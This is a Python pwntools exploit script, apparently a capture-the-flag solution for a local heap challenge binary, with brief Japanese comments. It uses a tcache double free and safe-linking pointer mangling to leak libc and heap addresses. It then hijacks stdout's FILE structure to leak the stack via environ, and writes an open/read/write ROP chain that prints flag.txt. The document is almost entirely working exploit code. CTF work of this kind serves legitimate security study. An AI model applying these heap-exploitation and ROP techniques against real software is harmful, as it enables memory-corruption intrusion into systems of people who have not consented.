#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./vuln")
elf    = context.binary = ELF("./vuln", checksec=False)
glibc  = elf.libc
if args.GDB:
    gdb.attach(target)

def write(idx, size, content):
    target.sendlineafter("> ", "1")
    target.sendlineafter("idx: ", str(idx))
    target.sendlineafter("size: ", str(size))
    target.sendlineafter("content: ", content)

def send(idx):
    target.sendlineafter("> ", "2")
    target.sendlineafter("idx: ", str(idx))

def read(idx):
    target.sendlineafter("> ", "3")
    target.sendlineafter("idx: ", str(idx))

def demangle(address):
    #tcacheに保存されたチャンクがbkを持ってるのは変わりない
    #ただそれがmangleされてるだけ
    foo = address >> 12 ^ address
    ret = foo >> 24 ^ foo
    return ret

def mangle(heap, address):
    return (heap >> 12) ^ address

def setup():
    for i in range(16):
        write(0, 0x10, b"")
    for i in range(16):
        write(0, 0x60, b"")
    for i in range(9):
        write(0, 0x70, b"")
    for i in range(5):
        write(0, 0xc0, b"")
    for i in range(2):
        write(0, 0xe0, b"")


setup()
for i in range(7):
    write(i, 0x100, b"1111")

write(7, 0x100, b"AAAA")
write(8, 0x100, b"BBBB")
write(9, 0x20,  b"guard")

for i in range(7):
    send(i)

#libcリークはこの時点で8を見てもよい 統合後は7じゃないとムリ
send(8)

#8 -> 7の順でfreeしてチャンクを統合させる
#8をもう一回freeするとtcahceに同じアドレス(double free)
send(7)
write(9, 0x100, b"this is tcache chunk")
send(8)

main_arena   = u64(target.recvline(read(7)).ljust(8, b"\x00")) 
glibc.address = main_arena - 0x219ce0
print("libc : ", hex(glibc.address))

heap_leak = u64(target.recvline(read(8)).ljust(8, b"\x00"))
heap      = demangle(heap_leak)
print("heap : ", hex(heap))


write(1, 0x130, b"a" * 0x108 + p64(0x111) + p64(mangle(heap, glibc.sym._IO_2_1_stdout_)))
write(2, 0x100, b"")

environ = glibc.sym.environ
payload = p32(0xfbad1800) + p32(0) + p64(environ) * 4 + p64(environ + 0x8) * 4 + p64(0) * 3
write(3, 0x100, payload)

stack_leak = u64(target.recvuntil(b"\x00\x00").ljust(8, b"\x00"))
rip        = stack_leak - 0x168
print("stack: ", hex(stack_leak))
print("rip  : ", hex(rip))

send(1)
send(2)
write(1, 0x130, b"a" * 0x108 + p64(0x111) + p64(mangle(heap, stack_leak - 0x188)))
write(2, 0x100, b"./flag.txt\x00")

flag_addr = heap + 0x330

pop_rdi     = p64(glibc.address + 0x000000000002a3e5)
pop_rsi     = p64(glibc.address + 0x000000000002be51)
pop_rax     = p64(glibc.address + 0x0000000000045eb0)
pop_rdx_r12 = p64(glibc.address + 0x000000000011f497)
syscall     = p64(glibc.address + 0x0000000000091396)

payload = b"a" * 0x28 + pop_rdi + p64(flag_addr) + pop_rax + p64(0x2) + pop_rsi + p64(0) + syscall
payload += pop_rax + p64(0) + pop_rdi + p64(3) + pop_rsi + p64(flag_addr) + pop_rdx_r12 + p64(0x100) + p64(0) + syscall
payload += pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + p64(flag_addr) + pop_rdx_r12 + p64(0x20) + p64(0) + syscall
write(3, 0x100, payload)



target.interactive()